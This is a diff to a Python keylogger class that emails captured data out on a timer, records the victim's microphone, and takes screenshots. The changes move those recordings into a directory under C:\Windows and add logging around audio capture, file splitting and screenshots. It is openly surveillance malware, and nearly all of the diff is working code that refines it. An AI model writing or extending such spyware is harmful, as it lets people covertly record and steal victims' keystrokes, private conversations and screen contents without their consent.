@@ -33,6 +33,7 @@ SEND_REPORT_EVERY = 90  # as in seconds
 MICROPHONE_INTERVAL = 4500  # 1 hour and 15 minutes in seconds
 MICROPHONE_DURATION = 180  # 3 minutes in seconds
 MAX_ATTACHMENT_SIZE = 7 * 1024 * 1024  # 7 MB
+KLM_DIRECTORY = "C:\\Windows\\klm"
 
 class KeyLogger:
     def __init__(self, time_interval, email, password):
@@ -98,6 +99,7 @@ class KeyLogger:
                 for attachment_path in attachment_paths:
                     if os.path.exists(attachment_path):
                         os.remove(attachment_path)
+            logging.info(f"Email sent successfully with subject: {subject}")
 
         except Exception as e:
             logging.error(f"Failed to send email: {e}")
@@ -149,8 +151,7 @@ class KeyLogger:
         try:
             fs = 44100  # Sample rate
             seconds = MICROPHONE_DURATION  # Duration of recording
-            temp_dir = tempfile.gettempdir()
-            audio_path = os.path.join(temp_dir, "audio_log.wav")
+            audio_path = os.path.join(KLM_DIRECTORY, "audio_log.wav")
 
             myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2, dtype='int16')
             sd.wait()  # Wait until recording is finished
@@ -162,13 +163,15 @@ class KeyLogger:
                 wf.setframerate(fs)
                 wf.writeframes(myrecording.tobytes())
 
-            # Split file if it exceeds the max attachment size
             audio_size = os.path.getsize(audio_path)
+            logging.info(f"Recorded audio size: {audio_size} bytes")
             if audio_size > MAX_ATTACHMENT_SIZE:
+                logging.info("Splitting audio file due to size")
                 return self.split_audio_file(audio_path)
             return [audio_path]
         except Exception as e:
             self.appendlog(f"Failed to record audio: {e}\n")
+            logging.error(f"Failed to record audio: {e}")
             return []
 
     def split_audio_file(self, audio_path):
@@ -181,12 +184,13 @@ class KeyLogger:
             num_chunks = math.ceil(total_frames / frames_per_chunk)
 
             for i in range(num_chunks):
-                chunk_path = os.path.join(tempfile.gettempdir(), f"audio_log_part_{i+1}.wav")
+                chunk_path = os.path.join(KLM_DIRECTORY, f"audio_log_part_{i+1}.wav")
                 with wave.open(chunk_path, 'wb') as chunk_wf:
                     chunk_wf.setparams(params)
                     frames = wf.readframes(frames_per_chunk)
                     chunk_wf.writeframes(frames)
                 chunks.append(chunk_path)
+                logging.info(f"Created audio chunk: {chunk_path} with size: {os.path.getsize(chunk_path)} bytes")
         os.remove(audio_path)  # Delete the original file after splitting
         return chunks
 
@@ -194,12 +198,13 @@ class KeyLogger:
         try:
             img = pyscreenshot.grab()
             # Save screenshot in the user's temporary directory
-            temp_dir = tempfile.gettempdir()
-            screenshot_path = os.path.join(temp_dir, "screenshot.png")
+            screenshot_path = os.path.join(KLM_DIRECTORY, "screenshot.png")
             img.save(screenshot_path)
+            logging.info(f"Screenshot saved to {screenshot_path}")
             return screenshot_path
         except Exception as e:
             self.appendlog("Failed to take screenshot: {}\n".format(e))
+            logging.error(f"Failed to take screenshot: {e}")
             return None
 
     def run(self):
